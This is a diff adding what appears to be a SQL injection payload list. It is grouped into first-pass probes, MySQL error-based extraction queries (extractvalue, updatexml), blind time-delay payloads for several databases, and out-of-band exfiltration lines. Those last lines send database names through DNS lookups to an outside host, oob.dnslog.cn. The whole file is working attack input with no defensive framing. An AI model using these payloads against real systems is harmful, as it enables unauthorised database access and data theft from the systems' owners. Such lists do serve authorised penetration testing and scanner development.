@@ -1,0 +1,25 @@
+# [First-pass]
+'
+"
+)
+'' ""
+' OR 1=1--
+1 OR 1=1
+') OR ('1'='1
+'; WAITFOR DELAY '0:0:5'--
+' AND SLEEP(5)-- -
+'||(SELECT pg_sleep(5))--
+1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)
+
+# [MySQL-Error]
+' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -
+' AND updatexml(1,concat(0x7e,(SELECT user())),1)-- -
+
+# [Blind-Time]
+' AND SLEEP(5)-- -
+'; WAITFOR DELAY '0:0:5'-- -
+'|| (SELECT pg_sleep(5))-- -
+
+# [OOB-Exfilter]
+LOAD_FILE(CONCAT('\\',(SELECT database()),'.oob.dnslog.cn\a'))
+EXEC master..xp_dirtree '\oob.dnslog.cn\a'
